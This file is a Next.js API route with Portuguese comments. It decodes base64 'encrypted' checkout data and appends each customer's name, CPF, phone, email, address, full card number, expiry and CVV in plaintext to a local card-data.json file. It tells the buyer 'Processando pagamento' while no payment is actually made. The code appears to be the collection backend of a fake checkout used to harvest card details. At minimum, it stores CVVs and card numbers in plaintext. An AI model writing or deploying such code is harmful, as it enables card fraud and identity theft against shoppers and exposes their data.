import { type NextRequest, NextResponse } from "next/server"
import fs from 'fs'
import path from 'path'

// Função simples de "descriptografia" (apenas para decode do base64)
function decryptData(encryptedData: string): any {
  try {
    const decoded = Buffer.from(encryptedData, 'base64').toString('utf-8')
    return JSON.parse(decoded)
  } catch (error) {
    throw new Error('Erro ao descriptografar dados')
  }
}

export async function POST(request: NextRequest) {
  try {
    const { data } = await request.json()
    
    // Descriptografar dados
    const cardData = decryptData(data)
    
    // Criar objeto com dados do cartão
    const savedData = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      customer: {
        name: cardData.customerName,
        cpf: cardData.customerCpf,
        phone: cardData.customerPhone,
        email: cardData.customerEmail,
        address: cardData.customerAddress
      },
      card: {
        number: cardData.cardNumber,
        holderName: cardData.cardHolderName,
        expiryDate: cardData.cardExpiryDate,
        cvv: cardData.cardCvv
      },
      product: {
        name: cardData.productName,
        price: cardData.productPrice,
        quantity: cardData.productQuantity
      },
      total: cardData.total
    }
    
    // Caminho do arquivo JSON
    const filePath = path.join(process.cwd(), 'card-data.json')
    
    // Ler dados existentes ou criar array vazio
    let existingData = []
    try {
      const fileContent = fs.readFileSync(filePath, 'utf-8')
      existingData = JSON.parse(fileContent)
    } catch (error) {
      // Arquivo não existe ainda
    }
    
    // Adicionar novo registro
    existingData.push(savedData)
    
    // Salvar no arquivo
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2))
    
    return NextResponse.json({ 
      success: true,
      message: "Processando pagamento",
      id: savedData.id
    })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao processar"
    }, { status: 500 })
  }
}
